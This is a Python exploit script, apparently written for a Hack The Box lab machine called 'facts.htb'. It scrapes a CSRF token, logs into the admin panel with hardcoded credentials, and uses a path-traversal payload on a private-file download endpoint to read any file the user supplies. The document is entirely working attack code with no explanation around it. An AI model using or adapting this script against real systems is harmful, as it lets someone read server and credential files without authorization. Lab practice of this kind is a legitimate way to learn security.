import requests
import sys
import re
from bs4 import BeautifulSoup

if len(sys.argv) < 2:
    print("Usage: python script.py <file_path>")
    sys.exit(1)

session = requests.Session()

base = "http://facts.htb"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/143.0.0.0"
}

login_page = session.get(f"{base}/admin/login", headers=headers)

soup = BeautifulSoup(login_page.text, "html.parser")

token_tag = soup.find("input", {"name": "authenticity_token"})

if not token_tag:
    print("CSRF token not found")
    sys.exit(1)

csrf_token = token_tag["value"]

print("[+] CSRF Token:", csrf_token)

login_data = {
    "authenticity_token": csrf_token,
    "user[username]": "light",
    "user[password]": "lightlight"
}

login_headers = {
    "Referer": f"{base}/admin/login",
    "Origin": base,
    "User-Agent": headers["User-Agent"],
    "Content-Type": "application/x-www-form-urlencoded"
}

login_res = session.post(
    f"{base}/admin/login",
    data=login_data,
    headers=login_headers
)

if "Invalid" in login_res.text:
    print("Login failed")
    sys.exit(1)

print("[+] Login successful")

file_path = sys.argv[1]

url = f"{base}/admin/media/download_private_file?file=../../../../../../{file_path}"

res = session.get(url, headers=headers)

try:
    data = res.json()

    if "file_content" in data:
        print("\n[+] File Content:\n")
        print(data["file_content"])
    else:
        print(data)

except:
    print("\n[+] Raw Response:\n")
    print(res.text)
